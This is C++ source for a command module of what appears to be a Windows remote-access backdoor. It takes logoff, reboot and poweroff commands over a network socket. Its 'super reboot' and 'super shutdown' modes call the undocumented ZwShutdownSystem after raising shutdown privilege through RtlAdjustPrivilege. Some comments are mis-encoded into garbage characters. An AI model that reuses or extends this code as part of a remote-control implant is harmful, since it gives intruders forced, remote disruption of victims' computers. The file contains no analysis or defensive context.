typedef BOOL (WINAPI*pZwShutdownSystem)(DWORD);
typedef BOOL (WINAPI*pRtlAdjustPrivilege)(int, BOOL, BOOL, LPDWORD);
#define SE_SHUTDOWN_PRIVILEGE             0x13


void NTShutDown(int Flag)
{
	pZwShutdownSystem ZwShutdownSystem;
	pRtlAdjustPrivilege RtlAdjustPrivilege;
	HMODULE hDLL;
	hDLL = LoadLibraryA("NTDLL.DLL");
	if(hDLL == NULL )
	{
		//printf("[-] GetModuleHandle  NTDLL error:%d\n",GetLastError());
		return;
	}
	ZwShutdownSystem = (pZwShutdownSystem)ZXSAPI::GetProcAddress(hDLL,"ZwShutdownSystem");
	if(ZwShutdownSystem == NULL)
	{
		//printf("[-] GetProcAddress ZwShutdownSystem error:%d\n",GetLastError());
		return;
	}
	RtlAdjustPrivilege = (pRtlAdjustPrivilege)ZXSAPI::GetProcAddress(hDLL,"RtlAdjustPrivilege");
	if(RtlAdjustPrivilege == NULL)
	{
		//printf("[-] GetProcAddress RtlAdjustPrivilege error:%d\n",GetLastError());
		return;
	}
	DWORD en;
    int nRet=RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE,TRUE,TRUE,&en);
    if(nRet==0x0C000007C)
        nRet = RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE,TRUE,FALSE,&en);    
    nRet=ZwShutdownSystem(Flag);
}

BOOL  Shutdown(SOCKET Socket,DWORD iCmd)
{
	char Cmd[3][10]={"Logoff","Reboot","Shutdown"};
	DebugPrivilege(SE_SHUTDOWN_NAME,TRUE);
	sprintf(Temp,"%s Is Taking Place......\r\n",Cmd[iCmd]);
	
	if(iCmd == 0 && !ZXSAPI::ExitWindowsEx(EWX_LOGOFF,0))
	{
		//sprintf(Temp,"Logoff Error: %d\r\n",GetLastError());
		err_display(Socket, "Shutdown->Logoff", 0);
	}
	else if(iCmd == 1 && !ZXSAPI::ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0))
	{
		//sprintf(Temp,"Reboot Error: %d\r\n",GetLastError());
		err_display(Socket, "Shutdown->Reboot", 0);
	}
	else if(iCmd == 2 && !ZXSAPI::ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, 0))
	{
		//sprintf(Temp,"Shutdown Error: %d\r\n",GetLastError());
		err_display(Socket, "Shutdown->Shutdown", 0);
	}
	else if(iCmd == 3)//��������
	{
		NTShutDown(1);
	}
	else if(iCmd == 4)//���ٹر�
	{
		NTShutDown(2);
	}
    SendMessage(Socket,Temp);
	DebugPrivilege(SE_SHUTDOWN_NAME,FALSE);
	memset(Temp,0,MAX_BUFF);
	return TRUE;
}


int Shutdown(MainPara *args)
{
	SPAMFUNCTION
		
	ARGWTOARGVA arg(args->lpCmd);
	int argc = arg.GetArgc();
	char **argv = arg.GetArgv();
	SOCKET Socket = args->Socket;
	char *Usage = ""
		"USAGE:\r\n"
		"      shutdown [ -01234]\r\n"
		"      -0    logoff.\r\n"
		"      -1    reboot.\r\n"
		"      -2    poweroff.\r\n"
		"      -3    super reboot.\r\n"
		"      -4    super shutdown.\r\n"
		"example:\r\n"
		"      shutdown -3\r\n";

	if(argc < 2)
	{
		SendMessage(Socket,Usage);
		return 0;
	}
/*
	BOOL bError = FALSE;
	for(int i=1; i<argc; i++)
	{
		if(argv[i][0] == '-')
		{
			if(!stricmp(&argv[i][1], "0"))
			{
				bError = TRUE;
				Shutdown(Socket, 0);
			}else if(!stricmp(&argv[i][1], "1"))
			{
				bError = TRUE;
				Shutdown(Socket, 1);
			}else if(!stricmp(&argv[i][1], "2"))
			{
				bError = TRUE;
				Shutdown(Socket, 2);
			}else if(!stricmp(&argv[i][1], "3"))
			{
				bError = TRUE;
				Shutdown(Socket, 3);
			}else if(!stricmp(&argv[i][1], "4"))
			{
				bError = TRUE;
				Shutdown(Socket, 4);
			}

			continue;
		}
	}
	if(bError == FALSE)
		SendMessage(Socket,Usage);
*/

	CGetOpt cmdopt(argc, argv, false);

	if(cmdopt.checkopt("0"))
		Shutdown(Socket, 0);
	else if(cmdopt.checkopt("1"))
		Shutdown(Socket, 1);
	else if(cmdopt.checkopt("2"))
		Shutdown(Socket, 2);
	else if(cmdopt.checkopt("3"))
		Shutdown(Socket, 3);
	else if(cmdopt.checkopt("4"))
		Shutdown(Socket, 4);
	else
		SendMessage(Socket,Usage);

	return 0;
}
